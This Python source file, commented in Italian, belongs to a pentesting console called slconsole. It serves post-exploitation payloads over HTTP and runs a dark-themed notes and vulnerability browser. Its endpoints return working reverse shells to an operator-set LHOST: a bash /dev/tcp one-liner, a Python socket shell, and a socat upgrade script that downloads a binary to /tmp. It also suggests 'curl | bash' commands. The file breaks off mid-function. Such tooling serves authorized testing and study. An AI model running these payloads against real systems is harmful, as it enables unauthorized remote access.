"""Quick-Delivery HTTP Server per slconsole.

Server HTTP in background che serve utility di post-exploitation:
  - Endpoint dinamici (/upgrade, /rev, /sh) che generano payload al volo
  - File statici dalla cartella static/ (linpeas.sh, winpeas.exe, ecc.)
  - Piattaforma web SLWeb per consultare notes, vuln e tools
"""
from __future__ import annotations

import html
import http.server
import io
import json
import os
import random
import socket
import socketserver
import subprocess
import threading
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
STATIC_ROOT = PROJECT_ROOT / "static"
VULN_ROOT = PROJECT_ROOT / "vuln"
NOTES_ROOT = PROJECT_ROOT / "notes"
TOOL_ROOT = PROJECT_ROOT / "tool"
TIPS_FILE = PROJECT_ROOT / "tips.txt"
SEALSAY_FILE = PROJECT_ROOT / "sealion_say.txt"

_server: socketserver.TCPServer | None = None
_thread: threading.Thread | None = None
_lhost: str = ""
_lport: int = 4444


def get_default_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def discover_interfaces() -> list[tuple[str, str]]:
    """Return list of (interface_name, ipv4_address) for non-loopback interfaces."""
    results: list[tuple[str, str]] = []
    try:
        out = subprocess.run(
            ["ip", "-4", "-o", "addr", "show"],
            capture_output=True, text=True, timeout=5,
        )
        for line in out.stdout.strip().splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                addr = parts[3].split("/")[0]
                if addr != "127.0.0.1":
                    results.append((iface, addr))
    except Exception:
        fallback = get_default_ip()
        if fallback != "127.0.0.1":
            results.append(("default", fallback))
    return results


UPGRADE_TEMPLATE = r"""#!/bin/bash
# === slconsole shell upgrade ===
# Metodo 1: socat (preferito — TTY piena)
if command -v socat >/dev/null 2>&1; then
    echo "[*] socat trovato, upgrade diretto..."
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
    exit 0
fi

# Metodo 2: scarica socat statico
echo "[*] Scaricamento socat statico..."
SOCAT_URL="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
if command -v curl >/dev/null 2>&1; then
    curl -s -L "$SOCAT_URL" -o /tmp/socat
elif command -v wget >/dev/null 2>&1; then
    wget -q "$SOCAT_URL" -O /tmp/socat
else
    # Metodo 3: fallback python pty
    echo "[*] Nessun downloader, fallback a python pty..."
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import pty,socket,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
    elif command -v python >/dev/null 2>&1; then
        python -c "import pty,socket,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
    else
        echo "[-] Nessun metodo disponibile per l'upgrade."
        exit 1
    fi
    exit 0
fi

chmod +x /tmp/socat
echo "[*] Lancio shell stabile verso {lhost}:{lport}..."
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
"""

REVSHELL_BASH = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"

REVSHELL_PYTHON = (
    "python3 -c 'import socket,subprocess,os;"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    's.connect(("{lhost}",{lport}));'
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call([\"/bin/bash\",\"-i\"])'\n"
)

INDEX_TEMPLATE = """<!DOCTYPE html>
<html><head><title>slconsole delivery</title></head><body>
<h2>slconsole — Quick Delivery Server</h2>
<h3>Endpoint dinamici</h3>
<ul>
  <li><code>curl {base}/upgrade | bash</code> — Upgrade shell (socat/python pty)</li>
  <li><code>curl {base}/rev</code> — Reverse shell Bash</li>
  <li><code>curl {base}/sh</code> — Reverse shell Python</li>
</ul>
<h3>File statici</h3>
<ul>
{file_list}
</ul>
<p><em>LHOST: {lhost} | LPORT: {lport}</em></p>
</body></html>
"""


# ---------------------------------------------------------------------------
# Web UI — Piattaforma per consultare notes, vuln, tools
# ---------------------------------------------------------------------------

_CSS = """\
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
:root{--bg:#0d1117;--surface:#151b23;--surface2:#1c2333;--border:#2a3142;
--text:#c9d1d9;--text2:#6e7681;--accent:#58a6ff;--accent2:#79c0ff;
--green:#3fb950;--green2:#56d364;--red:#f85149;--yellow:#d29922;
--code-bg:#0d1117;--hover:#1c2333;--glow:0 0 20px rgba(88,166,255,.08)}
body{font-family:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh;font-size:14px}
a{color:var(--accent);text-decoration:none}a:hover{color:var(--accent2)}
::selection{background:var(--accent);color:var(--bg)}

/* Topbar */
.topbar{background:var(--surface);border-bottom:1px solid var(--border);
padding:10px 24px;display:flex;align-items:center;justify-content:space-between;
position:sticky;top:0;z-index:10}
.topbar-left{display:flex;align-items:center;gap:20px}
.topbar .logo{font-size:16px;font-weight:700;color:var(--text);display:flex;
align-items:center;gap:8px}
.topbar .logo .prompt{color:var(--green);font-weight:700}
.topbar nav{display:flex;gap:2px}
.topbar nav a{font-size:13px;color:var(--text2);padding:5px 12px;border-radius:4px;
transition:all .15s;font-weight:500}
.topbar nav a:hover{background:var(--hover);color:var(--text)}
.topbar nav a.active{color:var(--accent);background:rgba(88,166,255,.1)}

/* Home layout */
.home-layout{display:grid;grid-template-columns:220px 1fr;gap:0;
min-height:calc(100vh - 45px)}

.sidebar{display:flex;flex-direction:column;gap:0;
background:var(--surface);border-right:1px solid var(--border);padding:16px}
.info-box{padding:12px 0;font-size:13px;border-bottom:1px solid var(--border)}
.info-box:last-child{border-bottom:none}
.info-box .label{color:var(--text2);font-size:11px;text-transform:uppercase;
letter-spacing:.5px;margin-bottom:4px;font-weight:600}
.info-box .value{color:var(--text);font-weight:500}
.info-box a{color:var(--accent);font-weight:500;font-size:12px;word-break:break-all}
.cat-list{list-style:none;margin-top:4px}
.cat-list li{padding:3px 0;display:flex;justify-content:space-between}
.cat-list li a{color:var(--text);font-weight:500}
.cat-list li a:hover{color:var(--accent)}
.cat-list .cnt{color:var(--text2);font-size:12px}

.main-area{padding:24px 32px;display:flex;flex-direction:column;min-height:0}

/* Sealsay — bubble on the right of the art */
.seal-container{flex:1;display:flex;flex-direction:column;align-items:center;
justify-content:center}
.seal-scene{display:flex;align-items:flex-start;gap:0}
.seal-art{color:var(--text2);font-size:11px;line-height:1.2;white-space:pre;
flex-shrink:0}
.seal-bubble-wrap{display:flex;flex-direction:column;justify-content:flex-start;
padding-top:0}
.seal-bubble{border:1px solid var(--border);border-radius:4px;padding:12px 16px;
font-size:13px;color:var(--text);max-width:480px;position:relative;
background:var(--surface2);margin-left:4px}
.seal-bubble::before{content:'';position:absolute;left:-7px;top:14px;
width:12px;height:12px;background:var(--surface2);border-left:1px solid var(--border);
border-bottom:1px solid var(--border);transform:rotate(45deg)}

/* Terminal input */
.terminal-input{margin-top:auto;padding-top:16px;font-size:13px;
border-top:1px solid var(--border);position:relative}
.terminal-input .prompt-line{display:flex;align-items:center;gap:0}
.terminal-input .user{color:var(--green)}
.terminal-input .path{color:var(--accent)}
.terminal-input input{background:none;border:none;color:var(--text);
font-family:inherit;font-size:13px;outline:none;flex:1;caret-color:var(--accent);
padding:0;margin-left:4px}
.terminal-input input::placeholder{color:var(--text2)}
.suggestions{position:absolute;bottom:100%;left:0;right:0;
background:var(--surface);border:1px solid var(--border);border-radius:4px;
margin-bottom:4px;display:none;overflow:hidden}
.suggestions.open{display:block}
.suggestions .sug{padding:8px 14px;font-size:13px;cursor:pointer;
display:flex;justify-content:space-between;color:var(--text);transition:background .1s}
.suggestions .sug:hover,.suggestions .sug.active{background:var(--hover)}
.suggestions .sug .sug-name{color:var(--accent);font-weight:600}
.suggestions .sug .sug-cnt{color:var(--text2);font-size:12px}

/* Inner pages */
.container{max-width:900px;margin:0 auto;padding:32px 24px 80px}

.page-title{font-size:22px;font-weight:700;margin-bottom:6px;
display:flex;align-items:center;gap:10px}
.page-title::before{content:'>';color:var(--green);font-weight:700}
.page-sub{color:var(--text2);font-size:12px;margin-bottom:24px}

.item-list{list-style:none}
.item-list li{border-bottom:1px solid var(--border)}
.item-list li a{display:flex;align-items:baseline;gap:8px;padding:12px 14px;
color:var(--text);font-size:14px;transition:background .1s;border-radius:4px}
.item-list li a:hover{background:var(--hover)}
.item-list li a .item-name{font-weight:600;color:var(--accent)}
.item-list li a .item-desc{color:var(--text2);font-size:12px}

.breadcrumb{font-size:12px;color:var(--text2);margin-bottom:18px;
display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.breadcrumb a{color:var(--text2)}
.breadcrumb a:hover{color:var(--accent)}
.breadcrumb span{color:var(--text2)}

/* Markdown */
.md-content{font-size:14px;line-height:1.75}
.md-content h1{font-size:26px;font-weight:700;margin:28px 0 10px;
border-bottom:1px solid var(--border);padding-bottom:8px;color:var(--text)}
.md-content h2{font-size:20px;font-weight:600;margin:24px 0 8px;
border-bottom:1px solid var(--border);padding-bottom:6px;color:var(--text)}
.md-content h3{font-size:16px;font-weight:600;margin:20px 0 6px;color:var(--accent)}
.md-content p{margin:8px 0}
.md-content ul,.md-content ol{margin:8px 0 8px 20px}
.md-content li{margin:3px 0}
.md-content code{background:var(--surface2);padding:2px 6px;border-radius:3px;
font-size:12.5px;font-family:inherit;border:1px solid var(--border);color:var(--accent2)}
.md-content pre{background:var(--code-bg);border:1px solid var(--border);
border-radius:6px;padding:14px;overflow-x:auto;margin:14px 0}
.md-content pre code{background:none;border:none;padding:0;font-size:12.5px;
color:var(--text)}
.md-content blockquote{border-left:2px solid var(--accent);padding:6px 14px;
margin:10px 0;background:var(--surface);border-radius:0 4px 4px 0;color:var(--text2)}
.md-content table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13px}
.md-content th,.md-content td{border:1px solid var(--border);padding:8px 12px;
text-align:left}
.md-content th{background:var(--surface);font-weight:600;color:var(--accent);
font-size:12px;text-transform:uppercase;letter-spacing:.3px}
.md-content tr:nth-child(even) td{background:rgba(255,255,255,.01)}
.md-content tr:hover td{background:var(--hover)}
.md-content hr{border:none;border-top:1px solid var(--border);margin:20px 0}
.md-content strong{color:#fff;font-weight:600}
.md-content a{color:var(--accent)}

/* Table scroll wrapper (injected by JS) */
.table-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
.table-scroll table{margin:0}

/* Static / files */
.file-card{background:var(--surface);border:1px solid var(--border);
border-radius:6px;padding:12px 16px;margin:6px 0;display:flex;
align-items:center;justify-content:space-between;transition:border-color .15s}
.file-card:hover{border-color:var(--accent)}
.file-card .fname{font-weight:600;font-size:13px;color:var(--accent)}
.file-card .fsize{color:var(--text2);font-size:12px}
.file-card .fcmd{font-size:11px;color:var(--text2);word-break:break-all}
.file-card .actions{display:flex;gap:6px;margin-left:12px;flex-shrink:0}

.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:4px;
font-size:12px;cursor:pointer;border:1px solid var(--border);background:var(--surface);
color:var(--text);transition:all .15s;text-decoration:none;font-family:inherit}
.btn:hover{background:var(--hover);border-color:var(--accent)}
.btn-primary{background:var(--accent);color:var(--bg);border-color:var(--accent);
font-weight:600}
.btn-primary:hover{background:var(--accent2)}
.btn-danger{color:var(--red);border-color:rgba(248,81,73,.4)}
.btn-danger:hover{background:rgba(248,81,73,.1)}
.btn-group{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}

.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;
align-items:center;justify-content:center}
.modal-overlay.open{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:8px;
padding:24px;width:90%;max-width:520px}
.modal h3{margin-bottom:14px;font-size:16px;color:var(--text);display:flex;
align-items:center;gap:8px}
.modal h3::before{content:'>';color:var(--green)}
.modal input[type=text],.modal textarea{width:100%;padding:10px 12px;border-radius:4px;
border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:13px;
font-family:inherit;margin-bottom:10px}
.modal textarea{min-height:180px;resize:vertical}
.modal .modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:6px}

.editor-wrap{margin-top:16px}
.editor-wrap textarea{width:100%;min-height:400px;padding:14px;border-radius:6px;
border:1px solid var(--border);background:var(--code-bg);color:var(--text);
font-family:inherit;font-size:13px;line-height:1.6;resize:vertical}
.editor-topbar{display:flex;align-items:center;justify-content:space-between;
margin-bottom:10px}
.editor-topbar .fname{font-size:16px;font-weight:700;color:var(--accent)}
.save-status{font-size:12px;color:var(--text2);margin-left:12px}

/* ===== MOBILE RESPONSIVE ===== */
@media(max-width:768px){
  body{font-size:13px}
  .topbar{padding:8px 12px;flex-wrap:wrap;gap:8px}
  .topbar-left{gap:10px;flex-wrap:wrap;width:100%}
  .topbar .logo{font-size:14px}
  .topbar nav{gap:0;flex-wrap:wrap}
  .topbar nav a{font-size:12px;padding:6px 10px}
  .home-layout{grid-template-columns:1fr;min-height:auto}
  .sidebar{border-right:none;border-bottom:1px solid var(--border);padding:12px 16px}
  .main-area{padding:16px}
  .seal-scene{flex-direction:column;align-items:center}
  .seal-art{font-size:7px;line-height:1.1;align-self:center}
  .seal-bubble-wrap{padding-top:8px;width:100%}
  .seal-bubble{margin-left:0;max-width:100%;font-size:12px}
  .seal-bubble::before{display:none}
  .terminal-input{padding-top:12px}
  .terminal-input .prompt-line{font-size:12px}
  .terminal-input input{font-size:14px;min-height:36px}
  .suggestions .sug{padding:12px 14px;min-height:44px}
  .container{padding:16px 12px 60px}
  .page-title{font-size:18px}
  .item-list li a{padding:14px 12px;flex-direction:column;gap:4px}
  .item-list li a .item-desc{font-size:11px}
  .md-content{font-size:13px}
  .md-content h1{font-size:20px}
  .md-content h2{font-size:17px}
  .md-content h3{font-size:14px}
  .md-content pre{padding:10px;font-size:11px}
  .md-content code{font-size:11px}
  .md-content th,.md-content td{padding:6px 8px;font-size:11px}
  .file-card{flex-direction:column;align-items:flex-start;gap:8px;padding:12px}
  .file-card .actions{margin-left:0;width:100%}
  .file-card .actions .btn{flex:1;justify-content:center;padding:8px 12px}
  .file-card .fsize{margin:0}
  .btn{padding:8px 14px;font-size:13px;min-height:40px}
  .btn-group{gap:6px}
  .modal{padding:16px;width:95%}
  .modal textarea{min-height:140px}
  .editor-wrap textarea{min-height:250px;font-size:12px}
  .editor-topbar{flex-direction:column;align-items:flex-start;gap:8px}
  .editor-topbar .fname{font-size:14px}
  .breadcrumb{font-size:11px}
}
@media(max-width:400px){
  .topbar nav a{font-size:11px;padding:5px 7px}
  .seal-art{font-size:5.5px}
  .container{padding:12px 8px 40px}
}
"""

_JS_MARKED = "https://cdn.jsdelivr.net/npm/marked@15/marked.min.js"
_JS_HLJS = "https://cdn.jsdelivr.net/npm/highlight.js@11/lib/highlight.min.js"
_CSS_HLJS = "https://cdn.jsdelivr.net/npm/highlight.js@11/styles/github-dark.min.css"


def _load_tips() -> list[str]:
    if TIPS_FILE.exists():
        return [l for l in TIPS_FILE.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
    return ["SeaLion Console"]


def _load_seal_art() -> str:
    if SEALSAY_FILE.exists():
        return SEALSAY_FILE.read_text(encoding="utf-8", errors="replace").rstrip()
    return ""


def _discover_notes() -> list[tuple[str, str]]:
    if not NOTES_ROOT.is_dir():
        return []
    return sorted((p.stem, p.stem.replace("-", " ").title()) for p in NOTES_ROOT.glob("*.md"))


def _discover_vulns() -> list[tuple[str, str]]:
    if not VULN_ROOT.is_dir():
        return []
    return sorted((p.stem, p.stem.upper()) for p in VULN_ROOT.glob("*.md"))


def _discover_tools() -> list[tuple[str, str]]:
    if not TOOL_ROOT.is_dir():
        return []
    results = []
    for p in sorted(TOOL_ROOT.iterdir(), key=lambda x: x.name.lower()):
        if p.is_dir() and not p.name.startswith(".") and not p.name.startswith("__"):
            help_f = p / "help.md"
            if not help_f.exists():
                help_f = p / "help.txt"
            if help_f.exists():
                results.append((p.name, p.name))
    return results


def _base_html(title: str, body: str, active: str = "") -> str:
    nav_items = [
        ("/", "Home", "home"),
        ("/notes/", "Notes", "notes"),
        ("/vuln/", "Vuln", "vuln"),
        ("/tools/", "Tools", "tools"),
        ("/static/", "Static", "static"),
    ]
    nav_html = ""
    for href, label, key in nav_items:
        cls = ' class="active"' if key == active else ""
        nav_html += f'<a href="{href}"{cls}>{label}</a>'

    return f"""<!DOCTYPE html>
<html lang="it"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{html.escape(title)} — SeaLion_Web</title>
<link rel="stylesheet" href="{_CSS_HLJS}">
<style>{_CSS}</style>
<script src="{_JS_MARKED}"></script>
<script src="{_JS_HLJS}"></script>
</head><body>
<div class="topbar">
<div class="topbar-left">
<a href="/" class="logo"><span class="prompt">&gt;_</span> SeaLion_Web</a>
<nav>{nav_html}</nav>
</div>
</div>
{body}
</body></html>"""


def _page_home() -> str:
    tips = _load_tips()
    tip = random.choice(tips)
    seal = html.escape(_load_seal_art())

    n_notes = len(_discover_notes())
    n_vulns = len(_discover_vulns())
    n_tools = len(_discover_tools())
    n_static = len([f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith(".")]) if STATIC_ROOT.is_dir() else 0

    body = f"""
<div class="home-layout">
<div class="sidebar">
  <div class="info-box">
    <div class="label">Versione:</div>
    <div class="value">v0.1.0</div>
  </div>
  <div class="info-box">
    <div class="label">GitHub:</div>
    <a href="https://github.com/Starlix27/SeaLion">github.com/Starlix27/SeaLion</a>
  </div>
  <div class="info-box">
    <div class="label">Creatrice:</div>
    <a href="https://github.com/Starlix27">@Starlix27</a>
  </div>
  <div class="info-box">
    <div class="label">Categorie ospitate:</div>
    <ul class="cat-list">
      <li><a href="/notes/">Notes</a><span class="cnt">{n_notes} guide</span></li>
      <li><a href="/vuln/">Vuln</a><span class="cnt">{n_vulns} protocolli</span></li>
      <li><a href="/tools/">Tools</a><span class="cnt">{n_tools} tool</span></li>
      <li><a href="/static/">Static</a><span class="cnt">{n_static} file</span></li>
    </ul>
  </div>
</div>
<div class="main-area">
  <div class="seal-container">
    <div class="seal-scene">
      <pre class="seal-art">{seal}</pre>
      <div class="seal-bubble-wrap">
        <div class="seal-bubble">{html.escape(tip)}</div>
      </div>
    </div>
  </div>
  <div class="terminal-input">
    <div class="suggestions" id="suggestions"></div>
    <div class="prompt-line">
      <span class="user">user@slweb</span>:<span class="path">~</span>$&nbsp;
      <input type="text" id="term-input" placeholder="notes, vuln, tools, static..." autocomplete="off" spellcheck="false">
    </div>
  </div>
</div>
</div>
<script>
(function(){{
  const cats=[
    {{name:'notes',label:'Notes',cnt:'{n_notes} guide',href:'/notes/'}},
    {{name:'vuln',label:'Vuln',cnt:'{n_vulns} protocolli',href:'/vuln/'}},
    {{name:'tools',label:'Tools',cnt:'{n_tools} tool',href:'/tools/'}},
    {{name:'static',label:'Static',cnt:'{n_static} file',href:'/static/'}},
  ];
  const input=document.getElementById('term-input');
  const box=document.getElementById('suggestions');
  let sel=-1;

  function render(filtered){{
    if(!filtered.length){{box.classList.remove('open');return;}}
    box.innerHTML=filtered.map((c,i)=>
      `<div class="sug${{i===sel?' active':''}}" data-href="${{c.href}}" data-name="${{c.name}}">` +
      `<span class="sug-name">${{c.label}}</span><span class="sug-cnt">${{c.cnt}}</span></div>`
    ).join('');
    box.classList.add('open');
    box.querySelectorAll('.sug').forEach(el=>{{
      el.addEventListener('click',()=>{{input.value=el.dataset.name;box.classList.remove('open');location.href=el.dataset.href;}});
      el.addEventListener('mouseenter',()=>{{sel=[...box.children].indexOf(el);render(filtered);}});
    }});
  }}

  function filter(){{
    const q=input.value.trim().toLowerCase();
    sel=-1;
    if(!q){{render(cats);return;}}
    render(cats.filter(c=>c.name.startsWith(q)||c.label.toLowerCase().startsWith(q)));
  }}

  input.addEventListener('input',filter);
  input.addEventListener('focus',filter);
  input.addEventListener('keydown',e=>{{
    const items=box.querySelectorAll('.sug');
    if(e.key==='ArrowDown'){{e.preventDefault();sel=Math.min(sel+1,items.length-1);filter();}}
    else if(e.key==='ArrowUp'){{e.preventDefault();sel=Math.max(sel-1,-1);filter();}}
    else if(e.key==='Tab'&&items.length){{e.preventDefault();const t=items[Math.max(sel,0)];input.value=t.dataset.name;filter();}}
    else if(e.key==='Enter'){{
      const active=items[Math.max(sel,0)];
      if(active)location.href=active.dataset.href;
      else{{const q=input.value.trim().toLowerCase();const m=cats.find(c=>c.name===q);if(m)location.href=m.href;}}
    }}
  }});
  document.addEventListener('click',e=>{{if(!e.target.closest('.terminal-input'))box.classList.remove('open');}});
}})();
</script>"""
    return _base_html("Home", body, active="home")


def _page_list(title: str, section: str, items: list[tuple[str, str]], descriptions: dict[str, str] | None = None) -> str:
    lis = ""
    for key, name in items:
        desc = ""
        if descriptions and key in descriptions:
            desc = f'<span class="item-desc">&mdash; {html.escape(descriptions[key])}</span>'
        lis += f'<li><a href="/{section}/{key}"><span class="item-name">{html.escape(name)}</span>{desc}</a></li>\n'

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> {html.escape(title)}</div>
<div class="page-title">{html.escape(title)}</div>
<div class="page-sub">{len(items)} elementi</div>
<ul class="item-list">{lis}</ul>
</div>"""
    return _base_html(title, body, active=section)


def _page_md(section: str, section_label: str, name: str, md_text: str) -> str:
    safe_md = md_text.replace("\\", "\\\\").replace("`", "\\`").replace("$", "\\$").replace("</", "<\\/")
    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/{section}/">{html.escape(section_label)}</a> <span>/</span> {html.escape(name)}</div>
<div class="md-content" id="md-target"></div>
<script>
document.getElementById('md-target').innerHTML=marked.parse(`{safe_md}`);
document.querySelectorAll('#md-target pre code').forEach(el=>{{if(typeof hljs!=='undefined')hljs.highlightElement(el);}});
document.querySelectorAll('#md-target table').forEach(t=>{{const w=document.createElement('div');w.className='table-scroll';t.parentNode.insertBefore(w,t);w.appendChild(t);}});
</script>
</div>"""
    return _base_html(name, body, active=section)


def _page_static_list() -> str:
    files = []
    if STATIC_ROOT.is_dir():
        files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))

    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = ""

    cards = ""
    for f in files:
        size = f.stat().st_size
        if size > 1_048_576:
            label = f"{size / 1_048_576:.1f} MB"
        elif size > 1024:
            label = f"{size / 1024:.1f} KB"
        else:
            label = f"{size} B"
        name = f.name
        if name.endswith(".sh"):
            cmd = f"curl {base}/{name} | bash"
        elif name.endswith(".exe"):
            cmd = f"curl {base}/{name} -o {name}"
        else:
            cmd = f"curl {base}/{name} -o {name} && chmod +x {name}"
        ename = html.escape(name)
        cards += f"""<div class="file-card">
<div style="min-width:0;flex:1"><div class="fname">{ename}</div><div class="fcmd">{html.escape(cmd)}</div></div>
<div class="fsize" style="margin:0 12px">{label}</div>
<div class="actions">
<a class="btn" href="/static/edit/{ename}">Apri</a>
<button class="btn btn-danger" onclick="deleteFile('{ename}')">Elimina</button>
</div>
</div>\n"""

    if not files:
        cards = '<p style="color:var(--text2)">Nessun file. Crea un nuovo file o usa <code>serve fetch</code> dalla console.</p>'

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Static Files</div>
<div class="page-title">Static Files</div>
<div class="page-sub">{len(files)} file disponibili</div>

<div class="btn-group">
<button class="btn btn-primary" onclick="openModal('new')">+ Nuovo file</button>
<button class="btn" onclick="openModal('import')">Importa file</button>
</div>

{cards}

<div class="modal-overlay" id="modal-new">
<div class="modal">
<h3>Nuovo file</h3>
<input type="text" id="new-fname" placeholder="Nome file (es. script.sh)">
<textarea id="new-content" placeholder="Contenuto del file..."></textarea>
<div class="modal-actions">
<button class="btn" onclick="closeModals()">Annulla</button>
<button class="btn btn-primary" onclick="createFile()">Crea</button>
</div>
</div>
</div>

<div class="modal-overlay" id="modal-import">
<div class="modal">
<h3>Importa file</h3>
<p style="color:var(--text2);font-size:14px;margin-bottom:12px">Seleziona uno o più file dal tuo computer.</p>
<input type="file" id="import-files" multiple style="margin-bottom:12px">
<div class="modal-actions">
<button class="btn" onclick="closeModals()">Annulla</button>
<button class="btn btn-primary" onclick="importFiles()">Importa</button>
</div>
</div>
</div>

<script>
function openModal(id){{document.getElementById('modal-'+id).classList.add('open');}}
function closeModals(){{document.querySelectorAll('.modal-overlay').forEach(m=>m.classList.remove('open'));}}
document.querySelectorAll('.modal-overlay').forEach(m=>{{
  m.addEventListener('click',e=>{{if(e.target===m)closeModals();}});
}});

function createFile(){{
  const name=document.getElementById('new-fname').value.trim();
  const content=document.getElementById('new-content').value;
  if(!name){{alert('Inserisci un nome file.');return;}}
  fetch('/api/static/save',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:name,content:content}})}})
  .then(r=>r.json()).then(d=>{{
    if(d.ok)location.reload();else alert(d.error);
  }});
}}

function importFiles(){{
  const input=document.getElementById('import-files');
  if(!input.files.length){{alert('Seleziona almeno un file.');return;}}
  const promises=[];
  for(const file of input.files){{
    const fd=new FormData();
    fd.append('file',file);
    promises.push(fetch('/api/static/upload',{{method:'POST',body:fd}}).then(r=>r.json()));
  }}
  Promise.all(promises).then(results=>{{
    const errors=results.filter(r=>!r.ok);
    if(errors.length)alert('Errori: '+errors.map(e=>e.error).join(', '));
    location.reload();
  }});
}}

function deleteFile(name){{
  if(!confirm('Eliminare '+name+'?'))return;
  fetch('/api/static/delete',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:name}})}})
  .then(r=>r.json()).then(d=>{{
    if(d.ok)location.reload();else alert(d.error);
  }});
}}
</script>
</div>"""
    return _base_html("Static", body, active="static")


def _page_static_edit(name: str) -> str:
    fpath = STATIC_ROOT / name
    is_binary = False
    content = ""
    if fpath.is_file():
        try:
            content = fpath.read_text(encoding="utf-8", errors="strict")
        except (UnicodeDecodeError, ValueError):
            is_binary = True

    ename = html.escape(name)
    econtent = html.escape(content)

    if is_binary:
        editor = f"""<div class="editor-wrap">
<p style="color:var(--text2);margin:40px 0;text-align:center">
Questo file è binario e non può essere modificato nel browser.<br>
<a href="/{ename}" class="btn" style="margin-top:12px">Scarica</a>
</p></div>"""
    else:
        editor = f"""<div class="editor-wrap">
<textarea id="editor">{econtent}</textarea>
</div>"""

    body = f"""<div class="container">
<div class="breadcrumb"><a href="/">Home</a> <span>/</span> <a href="/static/">Static</a> <span>/</span> {ename}</div>
<div class="editor-topbar">
<span class="fname">{ename}</span>
<div>
<span class="save-status" id="save-status"></span>
<button class="btn btn-primary" id="save-btn" onclick="saveFile()"{"" if not is_binary else ' disabled'}>Salva</button>
</div>
</div>
{editor}
<script>
function saveFile(){{
  const btn=document.getElementById('save-btn');
  const status=document.getElementById('save-status');
  btn.disabled=true;status.textContent='Salvataggio...';
  fetch('/api/static/save',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{name:'{ename}',content:document.getElementById('editor').value}})
  }}).then(r=>r.json()).then(d=>{{
    btn.disabled=false;
    status.textContent=d.ok?'Salvato!':'Errore: '+d.error;
    setTimeout(()=>status.textContent='',3000);
  }}).catch(()=>{{btn.disabled=false;status.textContent='Errore di rete';}});
}}
document.getElementById('editor')?.addEventListener('keydown',e=>{{
  if((e.ctrlKey||e.metaKey)&&e.key==='s'){{e.preventDefault();saveFile();}}
  if(e.key==='Tab'){{
    e.preventDefault();
    const t=e.target,s=t.selectionStart,end=t.selectionEnd;
    t.value=t.value.substring(0,s)+'    '+t.value.substring(end);
    t.selectionStart=t.selectionEnd=s+4;
  }}
}});
</script>
</div>"""
    return _base_html(f"Edit — {name}", body, active="static")


def get_web_url() -> str | None:
    if _server is None:
        return None
    port = _server.server_address[1]
    return f"http://{_lhost}:{port}"


class SlRequestHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        client = self.client_address[0]
        msg = fmt % args
        print(f"\033[93m[serve]\033[0m {client} — {msg}")

    def _send_text(self, body: str, content_type: str = "text/plain") -> None:
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _send_html(self, body: str) -> None:
        self._send_text(body, content_type="text/html; charset=utf-8")

    def _payload_vars(self) -> dict[str, str | int]:
        return {"lhost": _lhost, "lport": _lport}

    def do_GET(self) -> None:
        path = self.path.split("?")[0].rstrip("/") or "/"
        pv = self._payload_vars()

        ua = self.headers.get("User-Agent", "")
        is_curl = "curl" in ua.lower()

        if path == "/":
            if is_curl:
                self._serve_index(pv)
            else:
                self._send_html(_page_home())
        elif path in ("/upgrade", "/upgrade_revshell"):
            self._send_text(UPGRADE_TEMPLATE.format(**pv))
        elif path == "/rev":
            self._send_text(REVSHELL_BASH.format(**pv))
        elif path == "/sh":
            self._send_text(REVSHELL_PYTHON.format(**pv))
        elif path == "/notes":
            self._send_html(_page_list("Notes", "notes", _discover_notes()))
        elif path.startswith("/notes/"):
            self._serve_md_page("notes", "Notes", NOTES_ROOT, path[7:])
        elif path == "/vuln":
            self._send_html(_page_list("Vuln", "vuln", _discover_vulns()))
        elif path.startswith("/vuln/"):
